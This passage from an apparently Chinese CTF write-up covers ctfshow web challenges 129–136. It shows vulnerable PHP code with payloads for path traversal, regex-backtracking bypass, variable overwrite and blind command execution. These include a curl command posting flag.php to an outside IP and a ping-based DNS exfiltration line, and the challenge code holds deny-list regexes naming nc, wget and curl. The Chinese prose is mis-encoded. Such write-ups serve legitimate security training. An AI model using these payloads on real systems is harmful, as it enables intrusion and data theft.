</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s1">&#39;ctfshow&#39;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">echo</span> <span class="nx">readfile</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦è€ƒè™‘åœ¨ctfshowå‰é¢æ”¾ç‚¹ä»€ä¹ˆï¼Œä½†åˆä¸å½±å“æˆ‘ä»¬è¯»æ–‡ä»¶</p>
<p>å¯ä»¥è”æƒ³åˆ°ç›®å½•ç©¿è¶Š</p>
<p>payload:</p>
<pre tabindex="0"><code>/ctfshow/../../../../../../../../../../var/www/html/flag.php
</code></pre><h4 id="web130">web130<a hidden class="anchor" aria-hidden="true" href="#web130">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 05:19:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/.+?ctfshow/is&#39;</span><span class="p">,</span> <span class="nv">$f</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s1">&#39;ctfshow&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>&lsquo;/.+?ctfshow/is&rsquo; åé¢çš„iè¡¨ç¤ºå¤§å°å†™åŒ¹é…ï¼Œsè¡¨ç¤ºå¿½ç•¥æ¢è¡Œç¬¦ï¼Œå•è¡ŒåŒ¹é…</p>
<p>åœ¨ä¸åŠ è½¬ä¹‰å­—ç¬¦çš„å‰æä¸‹ï¼Œå‰é¢çš„ç‚¹è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼Œè€Œâ€œ+?â€è¡¨ç¤ºéè´ªå©ªåŒ¹é…ï¼Œå³å‰é¢çš„å­—ç¬¦è‡³å°‘å‡ºç°ä¸€æ¬¡</p>
<p>æ‰€ä»¥ï¼Œè¯¥æ­£åˆ™åŒ¹é…çš„æ„æ€ä¸ºï¼šctfshowå‰é¢å¦‚æœå‡ºç°ä»»æ„å­—ç¬¦ï¼Œå³åŒ¹é…å‡†ç¡®</p>
<p>å†æ ¹æ®ä¸‹é¢çš„striposä¸ºå­—ç¬¦ä¸²åŒ¹é…å‡½æ•°ï¼Œè¦æ±‚è¾“å…¥çš„å‚æ•°å¿…é¡»æœ‰â€œctfshowâ€å­—ç¬¦ï¼Œæ‰€ä»¥è¾“å…¥çš„å‚æ•°åªéœ€è¦æ»¡è¶³ctfshowå‰é¢ä¸åŠ ä»»æ„å­—ç¬¦å³å¯</p></blockquote>
<p>payload</p>
<pre tabindex="0"><code>POST f=ctfshow
</code></pre><h4 id="web131">web131<a hidden class="anchor" aria-hidden="true" href="#web131">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 05:19:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$f</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/.+?ctfshow/is&#39;</span><span class="p">,</span> <span class="nv">$f</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s1">&#39;36Dctfshow&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>æ­£åˆ™è¡¨è¾¾å¼æº¢å‡º <a href="https://www.laruence.com/2010/06/08/1579.html">https://www.laruence.com/2010/06/08/1579.html</a></p>
<p>payload:</p>
<pre tabindex="0"><code>#payload:
&lt;?php
echo str_repeat(&#39;very&#39;, &#39;250000&#39;).&#39;36Dctfshow&#39;;
</code></pre><p>ä¸å®œè¿‡å¤šï¼Œè¿‡å¤šä¼š</p>
<p><img alt="image-20250124131836252" loading="lazy" src="assets/image-20250124131836252.png"></p>
<h4 id="web132">web132<a hidden class="anchor" aria-hidden="true" href="#web132">#</a></h4>
<p><img alt="image-20250124132332538" loading="lazy" src="assets/image-20250124132332538.png"></p>
<p><img alt="image-20250124132344174" loading="lazy" src="assets/image-20250124132344174.png"></p>
<p>/admin</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 06:22:13
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 20:05:36
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">#error_reporting(0);
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nv">$code</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$code</span> <span class="o">===</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x36D</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">===</span> <span class="nv">$flag</span> <span class="o">||</span> <span class="nv">$username</span> <span class="o">===</span><span class="s2">&#34;admin&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$code</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ç¬¬ä¸€ä¸ªåˆ¤æ–­åé¢ç”¨çš„æ˜¯æˆ–</p>
<p>ä¹Ÿå°±æ˜¯è¯´åªè¦ä½¿usernameç­‰äºadminå³å¯ï¼Œå‰é¢ä¸¤ä¸ªæ— æ‰€è°“äº†</p>
<p>ç¬¬äºŒä¸ªåˆ¤æ–­è®©codeç­‰äºadminå³å¯</p>
<p>payloadï¼š</p>
<pre tabindex="0"><code>GET:?code=admin&amp;username=admin&amp;password=
</code></pre><h4 id="web133">web133<a hidden class="anchor" aria-hidden="true" href="#web133">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 16:43:44
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">//flag.php
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nv">$F</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;F&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/system|nc|wget|exec|passthru|netcat/i&#39;</span><span class="p">,</span> <span class="nv">$F</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$F</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><a href="https://www.cnblogs.com/hithub/p/16809053.html">ctfshow web133(å˜é‡è¦†ç›–+æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œdns_bpå¸¦å¤–) - hithub - åšå®¢å›­</a></p>
<p>è¿™å…¶å®æ˜¯ä¸€é“å…³äºå˜é‡è¦†ç›–çš„é¢˜ç›®</p>
<pre tabindex="0"><code>getä¼ å‚   F=`$F `;sleep 3
ç»è¿‡substr($F,0,6)æˆªå–å å¾—åˆ°  `$F `;
ä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ eval(&#34;`$F `;&#34;);
æˆ‘ä»¬æŠŠåŸæ¥çš„$Få¸¦è¿›å»
eval(&#34;``$F `;sleep 3`&#34;);
ä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆä¼šæ‰§è¡Œ  `   `$F `;sleep 3  ` == shell_exec(&#34;`$F `;sleep 3&#34;);
å‰é¢çš„å‘½ä»¤æˆ‘ä»¬ä¸éœ€è¦ç®¡ï¼Œä½†æ˜¯åé¢çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥è‡ªç”±æ§åˆ¶ã€‚
è¿™æ ·å°±åœ¨æœåŠ¡å™¨ä¸ŠæˆåŠŸæ‰§è¡Œäº† sleep 3
æ‰€ä»¥ æœ€åå°±æ˜¯ä¸€é“æ— å›æ˜¾çš„RCEé¢˜ç›®äº†
</code></pre><p>payload:</p>
<pre tabindex="0"><code>`$F `;cat flag.php | curl -X POST -d @- http://106.55.168.231:7777/
</code></pre><p>curlå¤–å¸¦rce</p>
<p><img alt="image-20250124143152342" loading="lazy" src="assets/image-20250124143152342.png"></p>
<h4 id="web134">web134<a hidden class="anchor" aria-hidden="true" href="#web134">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-14 23:01:06
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nv">$key1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$key2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key1&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key2&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key1&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key2&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;nonononono&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="o">@</span><span class="nx">parse_str</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$key1</span> <span class="o">==</span> <span class="s1">&#39;36d&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$key2</span> <span class="o">==</span> <span class="s1">&#39;36d&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><img alt="image-20250124144438661" loading="lazy" src="assets/image-20250124144438661.png"></p>
<p>çœ‹åˆ°extractæƒ³èµ·å˜é‡è¦†ç›–</p>
<pre tabindex="0"><code>extract($_POST);
//æå–$_POSTæ•°ç»„
</code></pre><p>payload:</p>
<pre tabindex="0"><code>?_POST[key1]=36d&amp;_POST[key2]=36d
</code></pre><h4 id="web135">web135<a hidden class="anchor" aria-hidden="true" href="#web135">#</a></h4>
<pre tabindex="0"><code>&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 18:48:03

*/

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET[&#39;F&#39;]){
    if(!preg_match(&#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#39;, $F)){
        eval(substr($F,0,6));
    }else{
        die(&#34;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&#34;);
    }
}
</code></pre><p>133plus</p>
<p>è¿™é¢˜banäº†å¾ˆå¤šå‘½ä»¤</p>
<p>ä½†æ˜¯æ²¡ban nl,mvï¼Œå¯ä»¥ç”¨nlå’ŒcpæŠŠflagå†™åˆ°å…¶ä»–æ–‡ä»¶ä¸­</p>
<p>payload:</p>
<pre tabindex="0"><code>`$F `;nl f*&gt;1.txt
`$F `;mv f*&gt;1.txt
</code></pre><p><img alt="image-20250124150917001" loading="lazy" src="assets/image-20250124150917001.png"></p>
<p>è¿™é¢˜ä¹Ÿå¯ä»¥ç”¨pingè¿›è¡Œå¤–å¸¦</p>
<pre tabindex="0"><code>`$F`;+ping `cat flag.php|awk &#39;NR==2&#39;`.6x1sys.dnslog.cn
#é€šè¿‡pingå‘½ä»¤å»å¸¦å‡ºæ•°æ®ï¼Œç„¶åawk NRä¸€æ’ä¸€æ’çš„è·å¾—æ•°æ®
</code></pre><h4 id="web136">web136<a hidden class="anchor" aria-hidden="true" href="#web136">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$x</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#39;</span><span class="p">,</span> <span class="nv">$x</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;too young too simple sometimes naive!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nx">check</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">exec</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜è¦ç”¨åˆ°ä¸€ä¸ªlinuxçš„å‘½ä»¤tee</p>
<blockquote>
<h3 id="linux-teeå‘½ä»¤ä»‹ç»">Linux <a href="https://so.csdn.net/so/search?q=tee&amp;spm=1001.2101.3001.7020">tee</a>å‘½ä»¤ä»‹ç»<a hidden class="anchor" aria-hidden="true" href="#linux-teeå‘½ä»¤ä»‹ç»">#</a></h3>
<p><code>tee</code>å‘½ä»¤åœ¨Linuxä¸­ç”¨äºä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ï¼Œå¹¶å°†å…¶å†™å…¥åˆ°æ ‡å‡†è¾“å‡ºå’Œä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ä¸­ã€‚<code>tee</code>å‘½ä»¤é€šå¸¸ä¸å…¶ä»–å‘½ä»¤ä¸€èµ·é€šè¿‡ç®¡é“ä½¿ç”¨ã€‚</p>
<p>å¦‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">ls /<span class="p">|</span>tee 1.txt
</span></span></code></pre></div><p>å°±å¯ä»¥å°†ls /çš„ç»“æœå†™å…¥åˆ°1.txtæ–‡ä»¶ä¸­</p></blockquote>
<pre tabindex="0"><code>ls /|tee 1
</code></pre><p>è¿™é¢˜banæ‰äº†.</p>
<p>è®¿é—®url/1ï¼Œä¸‹è½½æ–‡ä»¶1</p>
